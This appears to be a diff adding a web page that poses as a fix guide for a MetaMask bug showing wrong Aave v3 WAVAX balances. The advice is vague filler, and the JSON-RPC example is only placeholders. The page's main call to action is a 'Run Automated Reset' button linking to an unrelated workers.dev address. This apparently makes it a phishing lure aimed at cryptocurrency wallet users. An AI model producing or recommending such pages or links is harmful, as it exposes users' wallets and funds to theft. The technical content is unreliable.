@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token – Fix Guide</title>
+<style>
+    body {
+        font-family: BlinkMacSystemFont;
+        background: #1a1a24;
+        color: #ddd;
+        padding: 20px;
+        line-height: 1.5;
+    }
+    .content {
+        max-width: 880px;
+        margin: auto;
+        background: #1e1f24;
+        border-radius: 24px;
+        padding: 2rem;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    pre {
+        background: #0f0f12;
+        padding: 1rem;
+        border-radius: 12px;
+        overflow-x: auto;
+    }
+    a { color: #ff9455; }
+    .btn {
+        background: #cf6679;
+        color: #000;
+        padding: 14px 36px;
+        border-radius: 40px;
+        font-weight: bold;
+        display: inline-block;
+        text-decoration: none;
+        transition: 0.2s;
+    }
+    .btn:hover { transform: scale(1.02); }
+    </style>
+</head>
+<body>
+<div class="content">
+<h1>Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token</h1>
+<h2>Symptom</h2>
+<ul>
+<li>Users of the Metamask extension may notice an incorrect balance display for their Aave v3 WAVAX tokens on the Avalanche network, potentially causing confusion and incorrect financial decisions.</li>
+</ul>
+<h2>Technical Root Cause</h2>
+<ul>
+<li>The issue arises from a synchronization problem between Metamask and the Aave v3 protocol on the Avalanche network, leading to a mismatch in the reported token balance.</li>
+</ul>
+<h3>Manual Overrides</h3>
+<ul>
+<li>Update Metamask to the latest version to ensure compatibility with the Aave v3 protocol.</li>
+<li>Reset the Metamask account by removing and re-adding the Avalanche network.</li>
+<li>Utilize the following JSON-RPC method to manually fetch the token balance:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_call&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;to&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...AaveV3ContractAddress...&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;data&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...balanceOfMethodSignature...&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="s2">&quot;latest&quot;</span>
+<span class="w">  </span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>You may want to consider using an external console for more complex debugging. </p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Metamask extension installed and configured.</li>
+<li>Aave v3 protocol integrated with the Avalanche network.</li>
+<li>Basic understanding of JSON-RPC methods and token contract interactions.</li>
+</ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-bug-trying-to-navigate-back-from-the-manage-.html">Metamask Extension Bug Trying To Navigate Back From The Manage Network Page</a></li><li><a href="./archive/2026/06/metamask-extension-bug-swaps-changing-the-destination-token-cha.html">Metamask Extension Bug Swaps Changing The Destination Token Cha</a></li></ul>
+<div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
+</div>
+</div>
+</body>
+</html>
